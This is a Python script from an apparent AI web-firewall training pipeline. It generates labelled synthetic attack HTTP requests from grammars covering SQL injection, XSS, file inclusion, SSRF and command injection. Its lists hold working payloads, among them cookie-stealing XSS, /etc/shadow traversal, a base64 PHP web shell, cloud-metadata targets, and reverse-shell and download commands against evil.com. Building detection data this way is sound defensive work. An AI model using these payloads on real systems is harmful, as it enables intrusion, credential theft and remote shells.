"""
stages/3_data_augmentation/03_grammar_sqli.py  (also covers 04, 05, 06 via class dispatch)
--------------------------------------------------------------------------------
Stage 2.2-2.3 — Template + grammar based payload generation.

Uses a simple context-free grammar to produce novel but syntactically
valid attack payloads for each attack class.  Each grammar defines:
  - PREFIXES  : injection entry points (', ", 1 OR, etc.)
  - PAYLOADS  : attack payload patterns
  - SUFFIXES  : comment closers, null terminators
  - PARAMS    : realistic HTTP parameter names
  - ENDPOINTS : realistic API path patterns

Run a single class:
    python stages/3_data_augmentation/03_grammar_sqli.py --config config/pipeline.yaml --attack sqli

Run all:
    python stages/3_data_augmentation/03_grammar_sqli.py --config config/pipeline.yaml --attack all
"""

from __future__ import annotations

import argparse
import random
import json
import uuid
from dataclasses import dataclass, field
from pathlib import Path
from typing import Callable

import pyarrow.parquet as pq

from ai_waf_v2.data.schema import HttpRecord, records_to_table
from ai_waf_v2.utils.config import load_config
from ai_waf_v2.utils.logging import configure_root, get_logger
from ai_waf_v2.utils.seed import seed_everything

log = get_logger(__name__)


# ─────────────────────────────────────────────────────────
# Grammar definitions
# ─────────────────────────────────────────────────────────

@dataclass
class AttackGrammar:
    name:      str
    prefixes:  list[str]
    payloads:  list[str]
    suffixes:  list[str]
    params:    list[str]
    endpoints: list[str]
    methods:   list[str] = field(default_factory=lambda: ["GET", "POST"])


SQLI_GRAMMAR = AttackGrammar(
    name="sqli",
    prefixes=["'", '"', "1 OR", "1 AND", "1; ", "1/*", "' OR '1'='1", "\" OR \"1\"=\"1"],
    payloads=[
        "UNION SELECT NULL",
        "UNION SELECT NULL,NULL",
        "UNION SELECT NULL,NULL,NULL",
        "UNION ALL SELECT 1,2,3",
        "UNION SELECT username,password FROM users",
        "AND 1=1",
        "AND 1=2",
        "OR 1=1",
        "OR SLEEP(5)",
        "AND SLEEP(5)",
        "WAITFOR DELAY '0:0:5'",
        "AND BENCHMARK(5000000,MD5(1))",
        "ORDER BY 1--",
        "ORDER BY 100--",
        "GROUP BY 1",
        "HAVING 1=1",
        "AND (SELECT * FROM (SELECT(SLEEP(5)))a)",
        "AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))",
        "AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)",
    ],
    suffixes=["--", "-- -", "#", "/*", "/**/", ";--", "' --", "\" --", ""],
    params=[
        "id", "user_id", "item_id", "product_id", "order_id", "page",
        "search", "query", "q", "cat", "category", "filter", "sort",
        "offset", "limit", "key", "token", "session", "uid", "pid",
    ],
    endpoints=[
        "/api/v1/users", "/api/v1/products", "/api/v1/orders",
        "/search", "/products", "/users", "/admin/users",
        "/api/items", "/api/v2/data", "/shop/product",
    ],
)

XSS_GRAMMAR = AttackGrammar(
    name="xss",
    prefixes=["<", "\"><", "';", "'><", "javascript:", "data:text/html,"],
    payloads=[
        "script>alert(1)</script",
        "script>alert('XSS')</script",
        "img src=x onerror=alert(1)>",
        "img src=x onerror=alert(document.cookie)>",
        "svg onload=alert(1)>",
        "body onload=alert(1)>",
        "iframe src=javascript:alert(1)>",
        "input autofocus onfocus=alert(1)>",
        "select autofocus onfocus=alert(1)>",
        "video><source onerror=alert(1)>",
        "a href=javascript:alert(1)>click</a",
        "math><mtext></mtext><script>alert(1)</script>",
        "details open ontoggle=alert(1)>",
        "script src=//evil.com/x.js></script",
    ],
    suffixes=["", ">", "/>", "</div>"],
    params=[
        "name", "comment", "message", "description", "content",
        "title", "subject", "body", "text", "input", "value",
        "username", "email", "search", "q", "redirect", "url",
    ],
    endpoints=[
        "/comment", "/feedback", "/profile", "/search",
        "/post", "/message", "/signup", "/login",
        "/api/v1/comments", "/api/v1/messages",
    ],
    methods=["GET", "POST"],
)

LFI_GRAMMAR = AttackGrammar(
    name="lfi",
    prefixes=["", "../", "..\\", "....//", "..%2f"],
    payloads=[
        "../etc/passwd",
        "../../etc/passwd",
        "../../../etc/passwd",
        "../../../../etc/shadow",
        "..%2f..%2fetc%2fpasswd",
        "..%252f..%252fetc%252fpasswd",
        "..%c0%af..%c0%afetc%c0%afpasswd",
        "/etc/passwd",
        "/etc/shadow",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/var/log/apache2/access.log",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "....//....//etc/passwd",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://input",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
    ],
    suffixes=["%00", "", "&", "?"],
    params=[
        "file", "page", "path", "include", "doc", "document",
        "template", "load", "read", "view", "content", "dir",
    ],
    endpoints=[
        "/index.php", "/page.php", "/view.php",
        "/download.php", "/api/file", "/api/v1/document",
        "/include", "/template",
    ],
    methods=["GET"],
)

SSRF_GRAMMAR = AttackGrammar(
    name="ssrf",
    prefixes=["http://", "https://", "file://", "dict://", "gopher://", "ftp://"],
    payloads=[
        "169.254.169.254/latest/meta-data/",
        "169.254.169.254/latest/user-data/",
        "169.254.169.254/computeMetadata/v1/",
        "metadata.google.internal/computeMetadata/v1/",
        "localhost/admin",
        "localhost:8080",
        "127.0.0.1/admin",
        "0.0.0.0/admin",
        "127.1/admin",
        "[::1]/admin",
        "internal.service.local/api",
        "192.168.1.1",
        "10.0.0.1",
        "0177.0.0.1",    # octal
        "2130706433",    # decimal 127.0.0.1
    ],
    suffixes=["", "/", "?debug=1"],
    params=[
        "url", "uri", "href", "src", "source", "dest", "destination",
        "redirect", "proxy", "callback", "webhook", "next", "target",
        "load", "fetch", "request",
    ],
    endpoints=[
        "/api/v1/fetch", "/proxy", "/redirect",
        "/api/webhook", "/api/v1/callback",
        "/api/url", "/api/external",
    ],
    methods=["GET", "POST"],
)

CMDI_GRAMMAR = AttackGrammar(
    name="cmdi",
    prefixes=["; ", "| ", "|| ", "&& ", "`", "$(", "\n"],
    payloads=[
        "id",
        "whoami",
        "cat /etc/passwd",
        "cat /etc/shadow",
        "ls -la /",
        "uname -a",
        "ps aux",
        "env",
        "ping -c 1 evil.com",
        "curl http://evil.com/x",
        "wget http://evil.com/x",
        "bash -i >& /dev/tcp/evil.com/4444 0>&1",
        "nc -e /bin/sh evil.com 4444",
        "python3 -c 'import os; os.system(\"id\")'",
    ],
    suffixes=["", " #", " 2>&1", " > /dev/null", " &"],
    params=[
        "cmd", "command", "exec", "run", "ping", "host",
        "ip", "query", "input", "shell", "terminal",
    ],
    endpoints=[
        "/api/ping", "/admin/exec", "/api/command",
        "/api/v1/run", "/debug/exec", "/api/shell",
    ],
    methods=["GET", "POST"],
)

GRAMMAR_REGISTRY: dict[str, AttackGrammar] = {
    "sqli":  SQLI_GRAMMAR,
    "xss":   XSS_GRAMMAR,
    "lfi":   LFI_GRAMMAR,
    "ssrf":  SSRF_GRAMMAR,
    "cmdi":  CMDI_GRAMMAR,
}


# ─────────────────────────────────────────────────────────
# Generator
# ─────────────────────────────────────────────────────────

def generate_records(
    grammar:    AttackGrammar,
    n_samples:  int,
    rng:        random.Random,
) -> list[HttpRecord]:
    records = []
    for _ in range(n_samples):
        method   = rng.choice(grammar.methods)
        prefix   = rng.choice(grammar.prefixes)
        payload  = rng.choice(grammar.payloads)
        suffix   = rng.choice(grammar.suffixes)
        param    = rng.choice(grammar.params)
        endpoint = rng.choice(grammar.endpoints)

        injection = f"{prefix}{payload}{suffix}"

        if method == "GET":
            query_string = f"{param}={injection}"
            body         = ""
        else:
            query_string = ""
            body         = f"{param}={injection}"

        headers = json.dumps({
            "Host":            "target.example.com",
            "User-Agent":      _random_useragent(rng),
            "Accept":          "text/html,application/json,*/*",
            "Content-Type":    "application/x-www-form-urlencoded" if body else "",
        })

        r = HttpRecord(
            id=str(uuid.uuid4()),
            method=method,
            path=endpoint,
            query_string=query_string,
            headers=headers,
            body=body,
            label=1,
            attack_class=grammar.name,
            source=f"aug_grammar_{grammar.name}",
        ).build_raw()
        records.append(r)

    return records


def _random_useragent(rng: random.Random) -> str:
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0",
        "curl/7.88.1",
        "python-requests/2.28.2",
        "sqlmap/1.7",
    ]
    return rng.choice(agents)


# ─────────────────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────────────────

def run(args: argparse.Namespace) -> None:
    configure_root()
    cfg = load_config(args.config)
    rng = random.Random(cfg.project.seed)
    seed_everything(cfg.project.seed)

    n_per_class = cfg.augmentation.grammar.samples_per_class
    targets     = (
        list(GRAMMAR_REGISTRY.keys())
        if args.attack == "all"
        else [args.attack]
    )

    out_dir = Path(cfg.paths.data_augmented) / "grammar"
    out_dir.mkdir(parents=True, exist_ok=True)

    stats: dict[str, int] = {}

    for attack_class in targets:
        if attack_class not in GRAMMAR_REGISTRY:
            log.warning(f"No grammar defined for '{attack_class}' — skipping")
            continue

        grammar = GRAMMAR_REGISTRY[attack_class]
        records = generate_records(grammar, n_per_class, rng)

        out_path = out_dir / f"grammar_{attack_class}.parquet"
        pq.write_table(records_to_table(records), out_path, compression="snappy")

        stats[attack_class] = len(records)
        log.info(f"  {attack_class:15s}: {len(records):,} samples → {out_path.name}")

    stats_path = Path(cfg.paths.reports) / "metrics" / "augmentation_grammar.json"
    stats_path.parent.mkdir(parents=True, exist_ok=True)
    stats_path.write_text(json.dumps(stats, indent=2))
    log.info(f"Grammar generation complete. Total: {sum(stats.values()):,} samples")


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser()
    p.add_argument("--config", default="config/pipeline.yaml")
    p.add_argument("--attack", default="all",
                   choices=["all"] + list(GRAMMAR_REGISTRY.keys()))
    return p.parse_args()


if __name__ == "__main__":
    run(parse_args())